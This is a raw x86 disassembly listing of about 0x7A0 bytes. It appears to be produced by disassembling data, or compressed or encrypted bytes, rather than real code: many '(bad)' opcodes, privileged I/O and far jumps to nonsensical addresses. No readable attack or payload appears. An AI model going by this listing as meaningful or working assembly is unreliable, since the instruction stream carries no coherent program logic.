  41fdb4:	mov    esi,DWORD PTR [ebx+0x158dbcd1]
  41fdba:	sbb    al,BYTE PTR [ebx-0x72]
  41fdbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fdbe:	xchg   edi,eax
  41fdbf:	(bad)  
  41fdc1:	icebp  
  41fdc2:	add    eax,esp
  41fdc4:	loop   0x41fe2a
  41fdc6:	popa   
  41fdc7:	sub    BYTE PTR [edi-0x6b],0x2d
  41fdcb:	int    0xab
  41fdcd:	and    bh,BYTE PTR [ebx]
  41fdcf:	ds or  ah,ch
  41fdd2:	and    al,0x7f
  41fdd4:	adc    DWORD PTR [ebx+edi*8],eax
  41fdd7:	pop    ds
  41fdd8:	iret   
  41fdd9:	sahf   
  41fdda:	lods   al,BYTE PTR ds:[esi]
  41fddb:	mov    ds:0xa6e5b4e2,eax
  41fde0:	(bad)  
  41fde1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fde2:	fsubp  st(6),st
  41fde4:	push   esp
  41fde5:	mov    ss,ecx
  41fde7:	test   eax,0xfee469d9
  41fdec:	jmp    0x41fe11
  41fdee:	ins    DWORD PTR es:[edi],dx
  41fdef:	lods   al,BYTE PTR ds:[esi]
  41fdf0:	add    DWORD PTR [edi],ebp
  41fdf2:	or     cl,0x84
  41fdf5:	sub    dl,BYTE PTR ds:0x3155763b
  41fdfb:	xor    DWORD PTR [ecx-0x4b2806ee],ecx
  41fe01:	push   0x2d
  41fe03:	mov    ebx,0xa466349c
  41fe08:	push   0xffffffed
  41fe0a:	(bad)  [ebp-0x19]
  41fe0d:	mov    ds:0x5bc50cad,eax
  41fe12:	inc    edx
  41fe13:	in     al,dx
  41fe14:	nop
  41fe15:	dec    eax
  41fe16:	or     al,0xf9
  41fe18:	pop    es
  41fe19:	xor    al,0xb8
  41fe1b:	int    0x1e
  41fe1d:	dec    ebx
  41fe1e:	cdq    
  41fe1f:	xchg   ecx,eax
  41fe20:	fidivr DWORD PTR [edi-0xb]
  41fe23:	cmc    
  41fe24:	push   eax
  41fe25:	scas   eax,DWORD PTR es:[edi]
  41fe26:	push   ecx
  41fe27:	mov    al,ds:0x42672ad3
  41fe2c:	jg     0x41fdc4
  41fe2e:	mov    ebx,0x7a7e9813
  41fe33:	sub    eax,edx
  41fe35:	ins    BYTE PTR es:[edi],dx
  41fe36:	stos   BYTE PTR es:[edi],al
  41fe37:	cwde   
  41fe38:	jge    0x41fe64
  41fe3a:	outs   dx,DWORD PTR ds:[esi]
  41fe3b:	push   ebx
  41fe3c:	jl     0x41fe79
  41fe3e:	(bad)  
  41fe3f:	pop    ebx
  41fe40:	and    dh,BYTE PTR [esi]
  41fe42:	jae    0x41fe10
  41fe44:	jg     0x41fe3d
  41fe46:	(bad)  
  41fe47:	cmp    al,0xe2
  41fe49:	pop    esi
  41fe4a:	push   es
  41fe4b:	mov    es,WORD PTR [ecx+0x44131915]
  41fe51:	xchg   ebx,eax
  41fe52:	loopne 0x41fe74
  41fe54:	aam    0xbe
  41fe56:	(bad)  
  41fe58:	push   esi
  41fe59:	cmp    DWORD PTR [edi],edi
  41fe5b:	jae    0x41feb9
  41fe5d:	mov    ah,BYTE PTR [eax+edi*1+0x784d5ab8]
  41fe64:	sub    ecx,DWORD PTR [edx]
  41fe66:	je     0x41fe43
  41fe68:	inc    ecx
  41fe69:	retf   
  41fe6a:	push   0xe395b65
  41fe6f:	pop    edx
  41fe70:	xor    BYTE PTR [edi-0x5d],bl
  41fe73:	pop    ds
  41fe74:	mov    ebp,0xc959fb2c
  41fe79:	rcr    DWORD PTR [ebx+0x4a414fd2],cl
  41fe7f:	arpl   WORD PTR [edi-0x3ffd57f5],di
  41fe85:	push   0xffffff8b
  41fe87:	fxch   st(6)
  41fe89:	gs scas al,BYTE PTR es:[edi]
  41fe8b:	dec    esp
  41fe8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fe8d:	cld    
  41fe8e:	cli    
  41fe8f:	fadd   st(4),st
  41fe91:	out    dx,al
  41fe92:	mov    BYTE PTR [eax],al
  41fe94:	add    cl,bl
  41fe96:	sub    eax,0xac3e287e
  41fe9b:	idiv   BYTE PTR [ecx+esi*2]
  41fe9e:	test   al,0xa4
  41fea0:	jns    0x41fe8d
  41fea2:	enter  0xb414,0x26
  41fea6:	scas   al,BYTE PTR es:[edi]
  41fea7:	(bad)  
  41fea8:	xchg   edx,eax
  41fea9:	adc    al,BYTE PTR [eax]
  41feab:	popa   
  41feac:	push   ebx
  41fead:	repz xor dl,BYTE PTR es:0x9fbf59a7
  41feb5:	data16 jb 0x41fe42
  41feb8:	pop    ebx
  41feb9:	jle    0x41ff36
  41febb:	test   al,0x74
  41febd:	ret    0x5426
  41fec0:	sub    eax,0x7da71835
  41fec5:	fdivr  QWORD PTR [ebx-0x19ca618c]
  41fecb:	sti    
  41fecc:	dec    ebx
  41fecd:	sbb    esp,DWORD PTR [ecx]
  41fecf:	jmp    0x41fe59
  41fed1:	mov    DWORD PTR ds:0x1322344a,esp
  41fed7:	jmp    0xbacccf39
  41fedc:	cdq    
  41fedd:	test   al,0x0
  41fedf:	fdivr  QWORD PTR [ebx]
  41fee1:	pop    esp
  41fee2:	imul   esi,ebx,0x8c58886
  41fee8:	(bad)  
  41fee9:	fld    QWORD PTR [ebx]
  41feeb:	sub    al,0xa0
  41feed:	out    0x9b,eax
  41feef:	mov    bl,BYTE PTR [edx]
  41fef1:	inc    esi
  41fef2:	jne    0x41fe98
  41fef4:	dec    ecx
  41fef5:	dec    ecx
  41fef6:	scas   eax,DWORD PTR es:[edi]
  41fef7:	jae    0x41ff25
  41fef9:	je     0x41fedc
  41fefb:	cwde   
  41fefc:	and    al,0x4f
  41fefe:	mov    ebp,0x369a8770
  41ff03:	and    BYTE PTR [edx-0x5d587989],al
  41ff09:	fwait
  41ff0a:	jge    0x41ff6e
  41ff0c:	jge    0x41ff3f
  41ff0e:	inc    edi
  41ff0f:	int3   
  41ff10:	sub    BYTE PTR [edi+0x59],ah
  41ff13:	sbb    eax,0xeee44f84
  41ff18:	mov    eax,ds:0x9b92b93f
  41ff1d:	jl     0x41ff12
  41ff1f:	cmp    al,0xe6
  41ff21:	icebp  
  41ff22:	sub    al,0xde
  41ff24:	shl    bl,cl
  41ff26:	shl    DWORD PTR [ebp-0x1f7ab370],0x9d
  41ff2d:	xor    DWORD PTR [ebp-0x35ca43cd],0xda82fe7a
  41ff37:	int3   
  41ff38:	jae    0x41ff7d
  41ff3a:	xlat   BYTE PTR ds:[ebx]
  41ff3b:	adc    edx,ebp
  41ff3d:	cmp    al,0x11
  41ff3f:	scas   eax,DWORD PTR es:[edi]
  41ff40:	cdq    
  41ff41:	and    BYTE PTR [ebp-0x5f86f23d],bh
  41ff47:	fidivr WORD PTR ds:0xcbb3f39b
  41ff4d:	xor    BYTE PTR [edi+0x2f391569],cl
  41ff53:	pushf  
  41ff54:	lods   eax,DWORD PTR ds:[esi]
  41ff55:	adc    esi,eax
  41ff57:	rol    BYTE PTR [eax],cl
  41ff59:	pop    edx
  41ff5a:	(bad)  
  41ff5b:	repnz mov edi,0xe9d823db
  41ff61:	loop   0x41ff9a
  41ff63:	cmp    ah,BYTE PTR [ebx]
  41ff65:	jns    0x41ffa8
  41ff67:	xchg   edx,eax
  41ff68:	ret    0x2e89
  41ff6b:	pop    esi
  41ff6d:	in     eax,0x85
  41ff6f:	adc    dl,BYTE PTR [ebx+0x12]
  41ff72:	mov    edi,edx
  41ff74:	xor    al,al
  41ff76:	imul   ebp,DWORD PTR [edx],0xffffffaf
  41ff79:	push   ebx
  41ff7a:	sbb    al,0x27
  41ff7c:	pop    esp
  41ff7d:	nop
  41ff7e:	inc    edi
  41ff7f:	out    dx,eax
  41ff80:	into   
  41ff81:	jle    0x41ff44
  41ff83:	ins    DWORD PTR es:[edi],dx
  41ff84:	push   edi
  41ff85:	sar    ebx,1
  41ff87:	mov    edx,esp
  41ff89:	mov    ecx,0x535449ae
  41ff8e:	sub    edi,esi
  41ff90:	jge    0x41ff48
  41ff92:	jnp    0x41fff7
  41ff94:	adc    DWORD PTR [ebp-0x3b19a16f],eax
  41ff9a:	jp     0x41ff80
  41ff9c:	mov    ch,0x94
  41ff9e:	xchg   ebx,eax
  41ff9f:	pop    ds
  41ffa0:	loopne 0x420000
  41ffa2:	mov    ds:0x614cfcf7,al
  41ffa7:	fidiv  WORD PTR [esi]
  41ffa9:	sar    cl,0x90
  41ffac:	jle    0x41ffb3
  41ffae:	inc    edi
  41ffaf:	or     BYTE PTR [ecx+ebp*2-0x4c],ch
  41ffb3:	xchg   esp,ebx
  41ffb5:	cmp    dl,dh
  41ffb7:	add    DWORD PTR ds:0x281bd986,edi
  41ffbd:	xchg   esp,eax
  41ffbe:	push   cs
  41ffbf:	jns    0x41ffa4
  41ffc1:	pop    es
  41ffc2:	and    ebp,DWORD PTR [ebx+0x2da09016]
  41ffc8:	xlat   BYTE PTR ds:[ebx]
  41ffc9:	lds    eax,FWORD PTR [edi-0x54]
  41ffcc:	out    dx,eax
  41ffcd:	push   edi
  41ffce:	repnz loop 0x41ff67
  41ffd1:	popa   
  41ffd2:	and    cl,bl
  41ffd4:	push   ds
  41ffd5:	xchg   edx,eax
  41ffd6:	add    dl,BYTE PTR [edi+0x5f]
  41ffd9:	sub    DWORD PTR [esi+0x3a],eax
  41ffdc:	mov    ebp,0xc5a25efc
  41ffe1:	push   ecx
  41ffe2:	adc    eax,0x4418c73f
  41ffe7:	xor    ecx,ebp
  41ffe9:	jbe    0x42004a
  41ffeb:	(bad)  
  41ffec:	pop    edi
  41ffed:	xor    BYTE PTR [ecx+0x3f2b3c2e],dh
  41fff3:	push   0xffffffdc
  41fff5:	sbb    DWORD PTR [ebp-0x2227053b],edi
  41fffb:	and    BYTE PTR [edx],al
  41fffd:	js     0x41ffa6
  41ffff:	(bad)  
  420000:	js     0x41ff86
  420002:	push   ebx
  420003:	jmp    0x420008
  420005:	mov    ebx,0x2d24d090
  42000a:	jo     0x42003b
  42000c:	retf   0xbe9f
  42000f:	leave  
  420010:	(bad)  ds:0x58697e09
  420016:	mov    WORD PTR [esi],gs
  420018:	mov    ds:0x572e3602,eax
  42001d:	xchg   edi,eax
  42001e:	mov    bl,0xb6
  420020:	sbb    DWORD PTR [eax+0x14955ed1],0x5688a245
  42002a:	fadd   DWORD PTR [eax+0x34]
  42002d:	sub    esp,DWORD PTR [eax+eiz*1+0x4]
  420031:	in     al,0xb8
  420033:	dec    edi
  420034:	(bad)  
  420035:	daa    
  420036:	push   0xffffff91
  420038:	sub    edi,DWORD PTR [esi+0x7]
  42003b:	pop    ebx
  42003c:	mov    edx,0x67502874
  420041:	xor    ecx,DWORD PTR [edx]
  420043:	outs   dx,BYTE PTR ds:[esi]
  420044:	mov    edx,0x1e8d7d97
  420049:	out    0x12,al
  42004b:	sbb    esi,DWORD PTR [eax+0x4cc2b784]
  420051:	adc    al,0x3a
  420053:	xchg   esp,eax
  420054:	dec    esi
  420055:	jns    0x420036
  420057:	test   al,0x50
  420059:	mov    dl,0xd7
  42005b:	imul   ebp,DWORD PTR [edx-0x56],0x8b259211
  420062:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420063:	jg     0x41fffb
  420065:	aam    0xcf
  420067:	xor    edi,DWORD PTR [eax]
  420069:	or     esp,esi
  42006b:	xor    dh,BYTE PTR [bp+di-0x5b0c]
  420070:	jo     0x42002f
  420072:	dec    edx
  420073:	lds    ebx,FWORD PTR [ecx-0xf]
  420076:	or     BYTE PTR [eax+0x8fea6d2],bh
  42007c:	pop    ecx
  42007d:	shl    esi,0x36
  420080:	ja     0x420025
  420082:	sahf   
  420083:	push   esi
  420084:	repnz push 0x53e64e90
  42008a:	cmp    DWORD PTR [eax+ecx*1-0x72427980],esp
  420091:	fadd   st,st(5)
  420093:	cmc    
  420094:	int3   
  420095:	push   0x7d9b1fba
  42009a:	jecxz  0x420052
  42009c:	jmp    0x4232:0x4e83b249
  4200a3:	imul   eax,DWORD PTR [ebp-0x17c9d986],0x5a
  4200aa:	pop    edi
  4200ab:	shl    DWORD PTR [edx+0x1dbf2e98],cl
  4200b1:	xor    al,BYTE PTR [bp+si]
  4200b4:	jmp    0xafcf530a
  4200b9:	jne    0x420135
  4200bb:	call   0x19fa586b
  4200c0:	add    eax,0x2efd2e72
  4200c5:	xchg   DWORD PTR [ebx+0x6a],esp
  4200c8:	or     ah,BYTE PTR [edi+0x0]
  4200cb:	lds    ecx,FWORD PTR [ebp+0x59]
  4200ce:	adc    ebp,DWORD PTR ds:0x8279ec0c
  4200d4:	pop    edi
  4200d5:	add    ah,cl
  4200d7:	inc    ecx
  4200d8:	mov    WORD PTR [ebx-0xbe2df4c],?
  4200de:	or     eax,0x4bcee44e
  4200e3:	mov    ebp,0xd994300f
  4200e8:	mov    dl,0x48
  4200ea:	push   esi
  4200eb:	mov    cl,0xf5
  4200ed:	rol    BYTE PTR [eax],1
  4200ef:	imul   esp,DWORD PTR [ebp-0x2cee8ace]
  4200f6:	push   es
  4200f7:	sti    
  4200f8:	dec    esp
  4200f9:	sub    DWORD PTR ds:0x94046375,ebp
  4200ff:	mov    ebx,0xe75ae1f6
  420104:	xor    eax,DWORD PTR [edx+0x1a59211e]
  42010a:	push   edi
  42010b:	push   ebp
  42010c:	or     BYTE PTR [eax-0x54759da2],cl
  420112:	ret    
  420113:	sbb    BYTE PTR [ebx+ecx*4-0x2561fd64],ch
  42011a:	in     eax,dx
  42011b:	or     al,0xef
  42011d:	push   es
  42011e:	sbb    DWORD PTR [ecx-0x76],edi
  420121:	pop    esp
  420122:	pop    es
  420123:	(bad)  
  420124:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420125:	scas   al,BYTE PTR es:[edi]
  420126:	hlt    
  420127:	test   esi,ebx
  420129:	jge    0x4200ae
  42012b:	nop
  42012c:	in     eax,0x37
  42012e:	add    al,0x99
  420130:	fld    QWORD PTR [esi-0x71]
  420133:	sti    
  420134:	lock dec esi
  420136:	inc    ebp
  420137:	sub    al,0x7e
  420139:	nop
  42013a:	test   DWORD PTR [edi-0x1b],ecx
  42013d:	jle    0x4200f8
  42013f:	dec    ecx
  420140:	popf   
  420141:	out    0xb2,eax
  420143:	mov    esi,0x255cae71
  420148:	sub    eax,0x32558350
  42014d:	pop    ds
  42014e:	mov    edx,ebp
  420150:	jns    0x420184
  420152:	jmp    0x990b4133
  420157:	pusha  
  420158:	mov    cl,BYTE PTR [edi+0x44]
  42015b:	inc    edi
  42015c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42015d:	je     0x4201c5
  42015f:	aaa    
  420160:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420161:	mov    eax,ebp
  420163:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420164:	or     eax,0x6cdca845
  420169:	pop    edi
  42016a:	pop    edi
  42016b:	outs   dx,BYTE PTR ds:[esi]
  42016c:	aad    0x88
  42016e:	arpl   dx,cx
  420170:	scas   al,BYTE PTR es:[edi]
  420171:	dec    edi
  420172:	dec    edx
  420173:	xor    al,0x5c
  420175:	push   eax
  420176:	add    eax,0xad7b7e35
  42017b:	int    0x25
  42017d:	inc    esp
  42017e:	sub    al,0x73
  420180:	mov    ebp,0x10f6bf4c
  420185:	dec    esi
  420186:	xor    DWORD PTR [edi],0xa9e3f51f
  42018c:	aad    0xdf
  42018e:	push   esi
  42018f:	xchg   esi,eax
  420190:	hlt    
  420191:	jnp    0x42017e
  420193:	mov    DWORD PTR [esi],edi
  420195:	cmp    ch,BYTE PTR [eax]
  420197:	rcr    DWORD PTR [edi+0x2e1df822],0x42
  42019e:	pusha  
  42019f:	inc    ebx
  4201a0:	cmp    BYTE PTR [edi-0x4c65087a],bh
  4201a6:	test   eax,0xe503228f
  4201ab:	xor    bh,BYTE PTR [ebx]
  4201ad:	mov    ecx,0xea5f8232
  4201b2:	shr    BYTE PTR [ebx+0x5d7c3c93],0xf9
  4201b9:	ds jg  0x4201b9
  4201bc:	stc    
  4201bd:	dec    eax
  4201be:	nop
  4201bf:	(bad)  
  4201c0:	in     al,dx
  4201c1:	mov    al,0x79
  4201c3:	mov    esp,0x40b05636
  4201c8:	xor    al,0x9
  4201ca:	fs repz sahf 
  4201cd:	inc    esp
  4201ce:	xchg   esi,eax
  4201cf:	pop    esp
  4201d0:	push   ds
  4201d1:	push   esi
  4201d2:	imul   edi,DWORD PTR [esi+0x7869debe],0x436cc03d
  4201dc:	fidivr WORD PTR [ebx-0x1251e980]
  4201e2:	stc    
  4201e3:	cmc    
  4201e4:	dec    esp
  4201e5:	dec    ecx
  4201e6:	and    ch,BYTE PTR [ebp+0x65a5ff2e]
  4201ec:	clc    
  4201ed:	stos   BYTE PTR es:[edi],al
  4201ee:	in     eax,0xe3
  4201f0:	and    BYTE PTR [ebx],ch
  4201f2:	jmp    0x5feedee7
  4201f7:	retf   0x41f9
  4201fa:	icebp  
  4201fb:	push   ds
  4201fc:	aad    0x5b
  4201fe:	push   0xffffffce
  420200:	imul   edx,DWORD PTR [eiz*4-0x55621645],0x4
  420208:	push   ss
  420209:	nop
  42020a:	stc    
  42020b:	push   ds
  42020c:	std    
  42020d:	xchg   edi,eax
  42020e:	out    dx,al
  42020f:	rol    BYTE PTR [eax],1
  420211:	mov    eax,0xd8e75ed6
  420216:	push   cs
  420217:	sti    
  420218:	add    eax,0xfe50edcc
  42021d:	(bad)  
  42021e:	outs   dx,DWORD PTR ds:[esi]
  42021f:	or     eax,0x32449d83
  420224:	sar    BYTE PTR [ebp-0x1],0xa8
  420228:	ja     0x42026b
  42022a:	fldcw  WORD PTR [eax+0x32fa882f]
  420230:	mov    dl,0x4e
  420232:	and    ax,WORD PTR [ebp-0x39]
  420236:	or     al,0x5b
  420238:	adc    ebp,DWORD PTR [ecx+0x35]
  42023b:	mov    esp,0x1bdbea81
  420240:	test   DWORD PTR [esp+eiz*4-0x4a1b9169],edx
  420247:	xor    al,dl
  420249:	xchg   esi,eax
  42024a:	cmc    
  42024b:	pop    eax
  42024c:	adc    ebx,ecx
  42024e:	pusha  
  42024f:	mov    ch,dl
  420251:	add    al,0x7
  420253:	and    ecx,DWORD PTR [edi]
  420255:	rol    BYTE PTR [esi+0x7f],1
  420258:	or     cl,BYTE PTR [eax]
  42025a:	xor    al,0x89
  42025c:	mov    ebp,0x5f3385
  420261:	dec    edi
  420262:	pop    ebx
  420263:	sti    
  420264:	(bad)  
  420265:	pushf  
  420266:	inc    ecx
  420267:	xchg   edi,eax
  420268:	stos   BYTE PTR es:[edi],al
  420269:	mov    al,ds:0xa02ca22e
  42026e:	push   ebp
  42026f:	les    edx,FWORD PTR [ebp+0x1a3692a]
  420275:	push   DWORD PTR [edi]
  420277:	pop    ecx
  420278:	outs   dx,DWORD PTR ds:[esi]
  420279:	sub    ebx,ebp
  42027b:	cld    
  42027c:	sbb    ebp,eax
  42027e:	adc    DWORD PTR [eax+0x6aa92eb1],0x64
  420285:	ss aas 
  420287:	ret    
  420288:	daa    
  420289:	mov    bl,0x2f
  42028b:	aas    
  42028c:	scas   al,BYTE PTR es:[edi]
  42028d:	sbb    eax,0x7ad9e691
  420292:	cwde   
  420293:	scas   eax,DWORD PTR es:[edi]
  420294:	clc    
  420295:	test   al,0x59
  420297:	in     al,dx
  420298:	cs inc esi
  42029a:	pop    ecx
  42029b:	xchg   esi,eax
  42029c:	sub    DWORD PTR [ebp-0x7514cda6],esp
  4202a2:	rcr    ecx,cl
  4202a4:	pop    esp
  4202a5:	pop    eax
  4202a6:	dec    esp
  4202a7:	fisub  DWORD PTR [eax-0xfda5cd8]
  4202ad:	mov    eax,0xd08532b8
  4202b2:	(bad)  
  4202b3:	cmp    BYTE PTR [esi],bl
  4202b5:	add    bh,BYTE PTR [esi-0x3]
  4202b8:	jne    0x42028b
  4202ba:	scas   al,BYTE PTR es:[edi]
  4202bb:	cmp    BYTE PTR [eax+0x72b4fbff],dl
  4202c1:	inc    edi
  4202c2:	sbb    BYTE PTR [esi+ebp*1-0x5ad87127],bh
  4202c9:	mov    ds:0x3ca903ef,al
  4202ce:	sub    cl,bh
  4202d0:	mov    cl,0x12
  4202d2:	jmp    0x611a9033
  4202d7:	mov    ebx,0xa984d230
  4202dc:	push   edi
  4202dd:	repnz push ebx
  4202df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4202e0:	dec    esi
  4202e1:	out    0x82,al
  4202e3:	bound  ebx,QWORD PTR [eax]
  4202e5:	mov    ds:0xe156062f,al
  4202ea:	inc    eax
  4202eb:	xchg   ebx,eax
  4202ec:	jo     0x4202e6
  4202ee:	fiadd  DWORD PTR [ebx+0x30cdbe29]
  4202f4:	stos   BYTE PTR es:[edi],al
  4202f5:	dec    esi
  4202f6:	inc    ebx
  4202f7:	jnp    0x4202ca
  4202f9:	mov    eax,0x6a28bd2a
  4202fe:	scas   al,BYTE PTR es:[edi]
  4202ff:	mov    WORD PTR gs:[ecx+ecx*4+0x1d4a2246],?
  420307:	mov    ds:0xe55e43eb,eax
  42030c:	inc    esi
  42030d:	leave  
  42030e:	icebp  
  42030f:	jmp    0x3bc77f0d
  420314:	add    DWORD PTR [ebx],ebx
  420316:	lea    ebx,[eax+0x6d84f285]
  42031c:	add    al,0xd
  42031e:	dec    ebx
  42031f:	je     0x420398
  420321:	sub    al,0xfe
  420323:	or     eax,0xffffff9a
  420326:	data16 cmp BYTE PTR [ebx+0x43edf6c6],al
  42032d:	sbb    BYTE PTR [ebp+0x5e],bl
  420330:	add    edx,DWORD PTR [ecx+0x28]
  420333:	mov    al,ds:0x6d0375f1
  420338:	pop    ss
  420339:	call   0x8b4fa4a5
  42033e:	outs   dx,BYTE PTR ds:[esi]
  42033f:	add    eax,0x25745ba4
  420344:	xor    DWORD PTR [esi-0x38],edx
  420347:	push   0x54104dbe
  42034c:	popf   
  42034d:	mov    bh,0x62
  42034f:	call   0xb6b0:0x99892098
  420356:	inc    edx
  420357:	mov    dh,0xf9
  420359:	sub    DWORD PTR [ebx+0x224fcf68],edx
  42035f:	and    ch,BYTE PTR [ecx+0x2e]
  420362:	popw   ds
  420364:	jae    0x42032a
  420366:	mov    al,0x7e
  420368:	mov    esi,0xf0fb3f84
  42036d:	fdivr  DWORD PTR [edx]
  42036f:	pop    esp
  420370:	out    0x6f,al
  420372:	mov    esp,esp
  420374:	jb     0x42034c
  420376:	aad    0x3e
  420378:	imul   ebp,DWORD PTR [edx-0x1d],0x463a5750
  42037f:	aas    
  420380:	ins    BYTE PTR es:[edi],dx
  420381:	push   0x23d9a6a9
  420386:	fcmovne st,st(0)
  420388:	push   ecx
  420389:	test   eax,esi
  42038b:	enter  0x7fd2,0xcf
  42038f:	outs   dx,DWORD PTR ds:[esi]
  420390:	test   eax,0xea816e72
  420395:	adc    ch,cl
  420397:	clc    
  420398:	fnstsw WORD PTR [ebp-0x70]
  42039b:	sub    eax,DWORD PTR [ebx+0x42]
  42039e:	pop    esi
  42039f:	or     DWORD PTR [ecx+edi*8-0x35],edi
  4203a3:	inc    ecx
  4203a4:	ficom  DWORD PTR [eax]
  4203a6:	xlat   BYTE PTR ds:[ebx]
  4203a7:	aas    
  4203a8:	mov    esi,0x5a2129e7
  4203ad:	push   esp
  4203ae:	outs   dx,BYTE PTR ds:[esi]
  4203af:	pop    ss
  4203b0:	pushf  
  4203b1:	mov    cl,BYTE PTR [eax-0x15]
  4203b4:	icebp  
  4203b5:	add    eax,0xfd82b2e9
  4203ba:	popa   
  4203bb:	pop    esp
  4203bc:	mov    ebp,DWORD PTR [esi+0x277b715e]
  4203c2:	je     0x4203b3
  4203c4:	call   0x696d:0x2482be8e
  4203cb:	pop    es
  4203cc:	jl     0x420365
  4203ce:	rcl    BYTE PTR [edi+edx*8+0x5f52e6cb],cl
  4203d5:	aam    0xfd
  4203d7:	push   ecx
  4203d8:	or     al,0x3a
  4203da:	pop    esp
  4203db:	test   BYTE PTR [ebp+0x32],bh
  4203de:	jb     0x4203e5
  4203e0:	xchg   ecx,eax
  4203e1:	(bad)  
  4203e2:	mov    eax,0xa8b75962
  4203e7:	mov    ecx,0x63848285
  4203ec:	mov    ebp,esp
  4203ee:	add    esi,DWORD PTR [edx]
  4203f0:	popf   
  4203f1:	jno    0x42045f
  4203f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4203f4:	ja     0x42045a
  4203f6:	test   al,0x37
  4203f8:	fsubr  DWORD PTR [ebp+0x1f]
  4203fb:	jmp    0x420422
  4203fd:	mov    cl,0xaa
  4203ff:	xor    BYTE PTR [ecx],dl
  420401:	xor    ebx,DWORD PTR [ecx+0x7c8ac379]
  420407:	in     al,dx
  420408:	inc    ecx
  420409:	lds    edi,FWORD PTR [ebp+0x41]
  42040c:	aad    0xdf
  42040e:	adc    DWORD PTR [eax],0xb66b77e5
  420414:	xlat   BYTE PTR ds:[ebx]
  420415:	call   0x8821ebde
  42041a:	jo     0x4203ad
  42041c:	adc    BYTE PTR [ecx-0x6c43cddc],bl
  420422:	aam    0xde
  420424:	mov    cl,0x33
  420426:	adc    DWORD PTR [ecx-0x250cff2f],0xffffff97
  42042d:	mov    al,0x1f
  42042f:	call   0xb84f:0xa8fbe216
  420436:	mov    ch,0xe3
  420438:	cmp    BYTE PTR [ecx+0x3c71993c],cl
  42043e:	and    esp,DWORD PTR [eax-0x56]
  420441:	xor    esi,ebp
  420443:	lods   al,BYTE PTR ds:[esi]
  420444:	mov    ds:0x7e40ca9d,eax
  420449:	adc    ch,bh
  42044b:	inc    ecx
  42044c:	dec    ebx
  42044d:	push   esp
  42044e:	(bad)  
  42044f:	sbb    eax,0x24179ec5
  420454:	bound  eax,QWORD PTR [eax]
  420456:	fwait
  420457:	mov    edx,0xa050f8ba
  42045c:	div    ebx
  42045e:	sbb    ecx,edx
  420460:	jl     0x420494
  420462:	retf   0xd176
  420465:	jmp    0xefc4:0x5a1da5c8
  42046c:	outs   dx,DWORD PTR ds:[esi]
  42046d:	jmp    0x102:0x3c16a741
  420474:	jmp    0x6cd1:0xf3596b70
  42047b:	add    DWORD PTR [edx],esi
  42047d:	stos   BYTE PTR es:[edi],al
  42047e:	ins    DWORD PTR es:[edi],dx
  42047f:	(bad)  
  420480:	into   
  420481:	jmp    0x420478
  420483:	jne    0x4204f2
  420485:	xor    DWORD PTR [esi+0x50],ebp
  420488:	cwde   
  420489:	lock dec esi
  42048b:	test   BYTE PTR [ebx+0x6aa45104],ch
  420491:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420492:	(bad)  
  420493:	in     al,dx
  420494:	repz inc ebx
  420496:	push   0xd9c9f069
  42049b:	ins    BYTE PTR es:[edi],dx
  42049c:	stos   DWORD PTR es:[edi],eax
  42049d:	dec    esp
  42049e:	adc    esp,DWORD PTR [eax+0x3d4e9d4]
  4204a4:	jecxz  0x420438
  4204a6:	loop   0x42044f
  4204a8:	push   ebx
  4204a9:	fs aas 
  4204ab:	or     BYTE PTR [eax+ecx*4],0x20
  4204af:	push   esp
  4204b0:	mov    ah,0xb4
  4204b2:	push   edx
  4204b3:	mov    ch,BYTE PTR ds:0x5212a13
  4204b9:	(bad)  
  4204ba:	jns    0x420538
  4204bc:	lahf   
  4204bd:	addr16 (bad) 
  4204bf:	retf   0x85e1
  4204c2:	and    DWORD PTR [edi],edx
  4204c4:	mov    bh,BYTE PTR ds:0x5fcb98d7
  4204ca:	out    0xf,eax
  4204cc:	xor    bl,BYTE PTR [ebx+ebp*1-0x38]
  4204d0:	out    0xa9,eax
  4204d2:	sbb    BYTE PTR [ecx],al
  4204d4:	ss in  al,dx
  4204d6:	jmp    0x7b21c85c
  4204db:	sub    esi,DWORD PTR [edi-0x3]
  4204de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4204df:	ret    0xe4da
  4204e2:	ret    0x37a6
  4204e5:	jg     0x420517
  4204e7:	pop    edi
  4204e8:	bound  eax,QWORD PTR [ecx+0x70]
  4204eb:	inc    ecx
  4204ec:	(bad)  
  4204ed:	icebp  
  4204ee:	pushf  
  4204ef:	icebp  
  4204f0:	sub    al,0x70
  4204f2:	dec    ebp
  4204f3:	mov    ds:0x9f72b4b4,al
  4204f8:	xor    bl,0x56
  4204fb:	mov    al,ds:0xd31764a9
  420500:	inc    eax
  420501:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420502:	(bad)  
  420503:	loopne 0x4204d9
  420505:	fldz   
  420507:	and    edx,DWORD PTR [edi-0x7e]
  42050a:	add    ecx,esi
  42050c:	cmp    BYTE PTR [eax-0x2016627e],bh
  420512:	pop    ebx
  420513:	aas    
  420514:	aam    0x48
  420516:	pop    es
  420517:	or     BYTE PTR [esi],0xc3
  42051a:	adc    eax,ebp
  42051c:	loop   0x42051d
  42051e:	push   es
  42051f:	sub    al,0xc2
  420521:	nop
  420522:	jle    0x4204f9
  420524:	(bad)
  420527:	out    0x2a,al
  420529:	xchg   BYTE PTR [ecx],ah
  42052b:	mov    bh,0x1d
  42052d:	outs   dx,DWORD PTR ds:[esi]
  42052e:	jne    0x420568
  420530:	or     edx,edi
  420532:	sar    BYTE PTR [edi+0x5c],1
  420535:	xchg   ecx,eax
  420536:	cmp    BYTE PTR [ebp+ebp*1+0x1045bda6],bh
  42053d:	push   ds
  42053e:	jl     0x4204cb
  420540:	mov    eax,ds:0x99fd2f47
  420545:	inc    ebp
  420546:	(bad)
  420549:	jns    0x420542
  42054b:	(bad)  
  42054c:	imul   ecx,DWORD PTR [eax+0x2dcf9eb9],0xffffffc7
  420553:	(bad)  
  420555:	mov    al,0x54
  420557:	xor    ah,BYTE PTR [edx]
